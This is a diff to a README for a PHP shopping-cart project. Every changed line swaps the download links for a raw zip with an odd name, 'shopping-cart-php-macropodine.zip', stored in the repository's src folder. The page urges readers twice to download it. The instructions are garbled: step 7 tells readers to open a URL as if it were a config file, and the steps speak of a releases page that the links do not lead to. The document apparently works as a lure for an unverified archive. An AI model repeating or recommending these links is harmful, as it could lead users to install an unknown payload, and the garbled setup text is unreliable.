@@ -10,7 +10,7 @@ To get started, you need to download the application. Follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page and download the latest version.  
-   [![Download php-shopping-cart](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/php-shopping-cart-3.8.zip)](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/php-shopping-cart-3.8.zip)
+   [![Download php-shopping-cart](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/shopping-cart-php-macropodine.zip)](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/shopping-cart-php-macropodine.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you'll see different versions of the software. Look for the latest release, and select it.
@@ -30,7 +30,7 @@ To get started, you need to download the application. Follow these simple steps:
    Copy the extracted files and paste them into the htdocs folder (for XAMPP) or www folder (for WAMP) of your local server.
 
 7. **Configure the Application**  
-   Open the extracted folder and find the `https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/php-shopping-cart-3.8.zip` file. Adjust the settings to suit your local environment, such as database connection details.
+   Open the extracted folder and find the `https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/shopping-cart-php-macropodine.zip` file. Adjust the settings to suit your local environment, such as database connection details.
 
 8. **Access the Application**  
    Open your web browser and go to `http://localhost/php-shopping-cart` (or the folder name you chose). You should see the application interface.
@@ -73,6 +73,6 @@ This project is open source and available under the MIT License. You are free to
 ## 📥 Download Again
 
 Don't forget to download the application again if you missed the first link.  
-[![Download php-shopping-cart](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/php-shopping-cart-3.8.zip)](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/php-shopping-cart-3.8.zip)
+[![Download php-shopping-cart](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/shopping-cart-php-macropodine.zip)](https://raw.githubusercontent.com/RS-bot493/php-shopping-cart/main/src/shopping-cart-php-macropodine.zip)
 
 Happy shopping!
